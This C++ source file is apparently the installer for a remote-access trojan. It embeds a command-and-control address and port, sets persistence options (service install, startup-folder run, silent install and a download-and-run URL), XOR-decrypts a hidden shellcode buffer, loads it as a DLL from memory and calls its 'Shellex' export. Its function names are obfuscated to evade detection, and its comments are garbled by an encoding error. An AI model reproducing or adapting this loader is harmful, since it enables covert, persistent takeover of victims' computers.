// Install.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include <Shlobj.h>
#include "ShellCode.h"
#include "MemoryModule.h"
//������Ϣ�ṹ��
struct MODIFY_DATA
{
	TCHAR szDns1[300];      //���ߵ�ַ1
	TCHAR szDns2[300];      //���ߵ�ַ2
	DWORD dwPort1;          //���߶˿�1
	DWORD dwPort2;          //���߶˿�2
	TCHAR szGroup[50];      //���߷���
	TCHAR szVersion[32];    //���߰汾
	TCHAR SerName[100];     //��������
	TCHAR Serdisplay[128];  //��ʾ����
	TCHAR Serdesc[256];     //��������
	TCHAR szGetGroup[256];  //����Ψһ��ʶ
	BOOL  bLanPenetrate;    //�Ƿ�ʹ����������͸
	BOOL  bService;         //�Ƿ��Ƿ�������
	BOOL  bRuns;            //�Ƿ�������Ŀ¼����
	BOOL  bRunOnce;         //�Ƿ�Ϊ��ɫ��װ
	TCHAR ReleasePath[100]; //��װ;��
	TCHAR ReleaseName[50];  //��װ����
	WORD  Dele_zd;          //��װ����
	WORD  FileAttribute;    //�ļ�����
	BOOL Dele_Kzj;                //���߼�¼
	TCHAR szDownRun[512];   //�������е�ַ
};

MODIFY_DATA modify_data = 
{
	"192.168.1.101",
	"",
	8080,
	8080,
	"",
	"",
	"",
	"",
	"",
	"",
	FALSE,			//FALSEΪδʹ��������͸
	TRUE,			//TRUEΪ��������
	TRUE,			//TRUEΪ����Ŀ¼����
	TRUE,			//TRUEΪ��ɫ��װ��FALSEΪ��׼��װ
	"",
	"",
	0,
	FILE_ATTRIBUTE_NORMAL,
	0,
	""
};

void DecrypMain(char *Buff, int Size, char *AddTable)
{
	for (int i=0, j=0; i<Size; i++)
	{
		Buff[i] ^= AddTable[j++] % 1753 + 79;
		
		if (i % 5 == 0)
			j = 0;
	}
}

unsigned char MyFileTabLe[] = {0xBE, 0x16, 0xCF, 0x52, 0xCD};
typedef int (WINAPI *DDDDDDDDD)(MODIFY_DATA);
typedef BOOL (* MyDLL)(LPCTSTR lpData);
void AAA___JKASDANS____JOSDAS__HJGD( const char *name)
{
	
	HMEMORYMODULE hDll;
	DDDDDDDDD pfn;
	DecrypMain((char *)g_ShellCodeFileBuff, g_ShellCodeFileSize, (char *)MyFileTabLe);

	hDll=BBB__SADBGJY__DSFGHFHDKASQW(g_ShellCodeFileBuff);

	if (hDll==NULL)
	return ;
	pfn=(DDDDDDDDD)TTTTT_PPPPP_XSDSF45345(hDll,name);
		if (pfn==NULL)
		{	
			bbssss_gwegd4524_lfgdsdfsfhg_aaaaaa(hDll);
			return;
		}
		pfn(modify_data);
		if (hDll!=NULL)
		{

		bbssss_gwegd4524_lfgdsdfsfhg_aaaaaa(hDll);
        hDll=NULL;		
		}
		ExitProcess(0);

		
	
}

int APIENTRY WinMain(HINSTANCE hInstance,
					 HINSTANCE hPrevInstance,
					 LPSTR lpCmdLine, 
					 int nCmdShow)
{	
	char shellex[]={'S','h','e','l','l','e','x','\0'};	
	AAA___JKASDANS____JOSDAS__HJGD(shellex);
    return 0;
}

	

